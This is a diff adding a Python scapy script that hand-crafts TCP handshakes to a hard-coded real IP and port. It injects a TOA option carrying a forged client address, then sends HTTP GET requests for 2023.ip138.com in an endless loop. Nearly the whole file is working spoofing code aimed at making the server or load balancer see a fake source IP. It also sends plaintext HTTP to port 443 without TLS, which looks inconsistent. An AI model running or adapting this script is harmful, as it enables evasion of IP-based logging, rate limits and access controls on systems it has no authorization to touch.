@@ -1,0 +1,82 @@
+# -*- coding: utf-8 -*-
+"""
+Windows 管理员权限运行
+功能：
+1. 三次握手（SYN→SYN/ACK→ACK+TOA）
+2. 在 ACK+TOA 后立即发送 HTTP 请求
+3. 无限循环请求指定 URL，直到 Ctrl+C
+"""
+
+from scapy.all import *
+import socket
+import struct
+import time
+
+# ========== 可修改参数 ==========
+TARGET_IP   = '106.63.19.14'
+TARGET_PORT = 443
+FAKE_IP     = '111.111.111.222'
+HOST_HEADER = '2023.ip138.com'
+URI         = '/'
+LOOP_DELAY  = 1          # 每次请求间隔（秒）
+# =================================
+
+fake_ip_int = struct.unpack("!I", socket.inet_aton(FAKE_IP))[0]
+toa_option  = (254, b'\x50\x00\x00\x00' + struct.pack('!I', fake_ip_int))
+
+def build_http_req():
+    return (
+        f'GET {URI} HTTP/1.1\r\n'
+        f'Host: {HOST_HEADER}\r\n'
+        f'User-Agent: Mozilla/5.0\r\n'
+        f'Accept: */*\r\n\r\n'
+    )
+
+def toa_request():
+    ip_layer = IP(dst=TARGET_IP)
+
+    # 1. SYN
+    syn = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S')
+    syn_ack = sr1(ip_layer / syn, timeout=5, verbose=False)
+    if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+        print("[-] 三次握手失败")
+        return
+
+    # 2. 第三次握手 ACK + TOA（不带数据）
+    ack = TCP(
+        sport=syn_ack[TCP].dport,
+        dport=TARGET_PORT,
+        flags='A',
+        seq=syn_ack[TCP].ack,
+        ack=syn_ack[TCP].seq + 1,
+        options=[toa_option]
+    )
+    send(ip_layer / ack, verbose=False)
+
+    # 3. 发送业务数据（PSH/ACK）
+    http_req = build_http_req()
+    pkt = (
+        ip_layer /
+        TCP(
+            sport=syn_ack[TCP].dport,
+            dport=TARGET_PORT,
+            flags='PA',
+            seq=syn_ack[TCP].ack,
+            ack=syn_ack[TCP].seq + 1
+        ) /
+        Raw(load=http_req)
+    )
+    resp = sr1(pkt, timeout=5, verbose=False)
+    if resp and Raw in resp:
+        print(">>> 收到响应长度：", len(resp[Raw].load))
+    else:
+        print("[-] 无响应")
+
+if __name__ == '__main__':
+    print("按 Ctrl+C 停止循环")
+    try:
+        while True:
+            toa_request()
+            time.sleep(LOOP_DELAY)
+    except KeyboardInterrupt:
+        print("\n[+] 用户主动结束")
